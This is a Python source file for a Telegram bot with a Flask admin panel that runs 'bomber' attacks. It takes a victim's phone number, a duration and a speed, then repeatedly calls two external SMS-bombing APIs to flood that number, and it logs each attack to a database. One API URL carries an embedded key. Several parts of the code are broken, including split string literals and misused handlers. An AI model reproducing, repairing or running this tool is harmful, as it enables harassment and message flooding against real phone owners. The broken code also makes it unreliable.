from flask import Flask, request, jsonify, send_from_directory
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ParseMode
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ConversationHandler, MessageHandler, filters
import requests
import asyncio
import threading
import time
from datetime import datetime, timedelta
import os
import sqlite3
import plotly.graph_objects as go
import plotly.express as px
from io import BytesIO

app = Flask(__name__)

# ================= CONFIG =================
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))  # अपना Telegram ID
OWN_NUMBER = os.getenv("OWN_NUMBER", "9876543210")

# Bomber APIs (file:65 से exact)
API1 = "https://boomberxnexu.vercel.app/api?number={}&country=91&count=10"
API2 = "https://ft-bomber.onrender.com/bomb?num={}&count=10&api_key=Sp5En6lWIppHZfg9yvY-R5eHtpd3fCEF"

# States
WAITING_NUMBER, WAITING_TIME, WAITING_MULTI_NUMBERS = range(3)

# Global state
active_attacks = {}
attack_history = []
db = sqlite3.connect('attacks.db', check_same_thread=False)
db.execute('''CREATE TABLE IF NOT EXISTS attacks 
              (id TEXT PRIMARY KEY, number TEXT, duration INT, 
               requests INT, speed TEXT, status TEXT, time TEXT)''')

SPEED_MODES = {'1x': 0.5, '2x': 0.2, '5x': 0.05}

# ================= ADMIN PANEL =================
@app.route('/admin')
def admin_panel():
    active = len([a for a in active_attacks.values() if a.get('running', False)])
    history = db.execute('SELECT * FROM attacks ORDER BY time DESC LIMIT 10').fetchall()
    return f"""
<!DOCTYPE html>
<html>
<head><title>Bomber Admin</title>
<style>body{{background:#111;color:#0f0;font-family:monospace;padding:20px;}} .card{{background:#222;padding:20px;margin:10px;border:1px solid #0f0;}}</style></head>
<body>
<h1>🎛️ BOMBER ADMIN PANEL</h1>
<div class='card'><h3>📊 LIVE STATS</h3>
Active Attacks: <b>{active}</b> | Total History: {len(history)}</div>
<div class='card'><h3>📈 LAST ATTACKS</h3>
{''.join([f"<p>{r[1]} - {r[3]} req - {r[4]} speed</p>" for r in history])}</div>
</body></html>
    """

@app.route('/health')
def health():
    return jsonify({
        'status': 'alive',
        'active_attacks': len(active_attacks),
        'admin_id': ADMIN_ID
    })

# ================= TELEGRAM BOT =================
application = None

async def start(update: Update, context):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ **Admin only**")
        return
    
    keyboard = [
        [InlineKeyboardButton("🚀 SINGLE BOMBER", callback_data="single_bomber")],
        [InlineKeyboardButton("🔄 MULTI NUMBER", callback_data="multi_bomber")],
        [InlineKeyboardButton("⚡ SPEED CONTROL", callback_data="speed_control")],
        [InlineKeyboardButton("📊 DASHBOARD", url=f"https://{request.host}/admin")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🎛️ **ULTIMATE BOMBER PANEL** 🎛️

"
        f"👑 Admin: {update.effective_user.first_name}
"
        f"📱 Default Number: `{OWN_NUMBER}`",
        reply_markup=reply_markup, parse_mode='Markdown'
    )

# ================= ATTACK LOGIC =================
def bomber_worker(attack_id, numbers, duration_min, speed='1x'):
    """तेरे bomber.py का exact unlimited logic"""
    attack_data = active_attacks[attack_id]
    end_time = datetime.now() + timedelta(minutes=duration_min)
    delay = SPEED_MODES.get(speed, 0.5)
    total_requests = 0
    
    apis = [API1, API2]
    
    while datetime.now() < end_time and attack_data['running']:
        for number in numbers:
            for api_fmt in apis:
                try:
                    url = api_fmt.format(number, 10)
                    r = requests.get(url, timeout=5)
                    total_requests += 1
                    attack_data['total_requests'] = total_requests
                except:
                    pass  # Silent continue
        
        time.sleep(delay)
    
    # Save to DB
    db.execute(
        "INSERT INTO attacks VALUES (?, ?, ?, ?, ?, ?, ?)",
        (attack_id, ','.join(numbers), duration_min, total_requests, speed, 'completed', datetime.now().isoformat())
    )
    db.commit()
    
    attack_data['running'] = False

async def single_bomber_callback(update: Update, context):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        f"📱 **Enter number** (10 digits)
"
        f"Default: `{OWN_NUMBER}`",
        parse_mode='Markdown'
    )
    return WAITING_NUMBER

async def receive_number(update: Update, context):
    number = update.message.text.strip()
    
    if len(number) != 10 or not number.isdigit():
        await update.message.reply_text("❌ 10 digits only!")
        return WAITING_NUMBER
    
    context.user_data['numbers'] = [number]
    
    keyboard = [[InlineKeyboardButton("⏱️ TIME (Minutes)", callback_data="set_time")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"✅ **Number**: `{number}`

👆 Set duration",
        reply_markup=reply_markup, parse_mode='Markdown'
    )
    return WAITING_TIME

async def set_time_callback(update: Update, context):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text("⏱️ **Minutes?** (1-60)")
    return WAITING_TIME

async def receive_time(update: Update, context):
    duration = int(update.message.text.strip())
    
    numbers = context.user_data['numbers']
    speed = context.user_data.get('speed', '1x')
    attack_id = f"{update.effective_chat.id}_{int(time.time())}"
    
    active_attacks[attack_id] = {
        'running': True, 'total_requests': 0, 'numbers': numbers,
        'duration': duration, 'speed': speed, 'chat_id': update.effective_chat.id
    }
    
    # Start background attack
    threading.Thread(
        target=bomber_worker, 
        args=(attack_id, numbers, duration, speed),
        daemon=True
    ).start()
    
    await update.message.reply_text(
        f"💣 **ATTACK LIVE** 💣

"
        f"📱 `{numbers[0]}`
"
        f"⏱️ `{duration}` min
"
        f"⚡ `{speed}` speed

"
        f"📊 Check `/admin` for live stats
"
        f"🛑 `/stop` to cancel",
        parse_mode='Markdown'
    )
    return ConversationHandler.END

async def stop(update: Update, context):
    stopped = 0
    for aid in list(active_attacks.keys()):
        if str(update.effective_chat.id) in aid:
            active_attacks[aid]['running'] = False
            stopped += 1
    await update.message.reply_text(f"🛑 **Stopped {stopped} attacks**")

# Speed control
async def speed_callback(update: Update, context):
    keyboard = [
        [InlineKeyboardButton("🐌 1x", callback_data="speed_1x")],
        [InlineKeyboardButton("⚡ 2x", callback_data="speed_2x")],
        [InlineKeyboardButton("🚀 5x", callback_data="speed_5x")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text("⚡ **Select Speed**:", reply_markup=reply_markup)

async def speed_selected(update: Update, context):
    speed = update.callback_query.data.split('_')[1]
    context.user_data['speed'] = speed
    await update.callback_query.answer(f"✅ Speed set: {speed}")
    await update.callback_query.message.reply_text("Speed saved! Use with bomber.")

# Conversation handler
conv_handler = ConversationHandler(
    entry_points=[CallbackQueryHandler(single_bomber_callback, pattern="single_bomber")],
    states={
        WAITING_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_number)],
        WAITING_TIME: [CallbackQueryHandler(set_time_callback, pattern="set_time"),
                      MessageHandler(filters.TEXT & ~filters.COMMAND, receive_time)]
    },
    fallbacks=[CommandHandler('stop', stop)]
)

# Flask webhook
@app.route(f'/{TELEGRAM_TOKEN}', methods=['POST'])
def telegram_webhook():
    global application
    if application is None:
        return 'Bot not ready', 503
    
    update = Update.de_json(request.get_json(force=True), application.bot)
    asyncio.create_task(application.process_update(update))
    return 'OK'

if __name__ == '__main__':
    global application
    application = Application.builder().token(TELEGRAM_TOKEN).build()
    
    application.add_handler(CommandHandler('start', start))
    application.add_handler(CommandHandler('admin', admin_panel))
    application.add_handler(conv_handler)
    application.add_handler(CallbackQueryHandler(speed_selected, pattern="speed_.*"))
    application.add_handler(CallbackQueryHandler(speed_callback, pattern="speed_control"))
    
    app.application = application
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
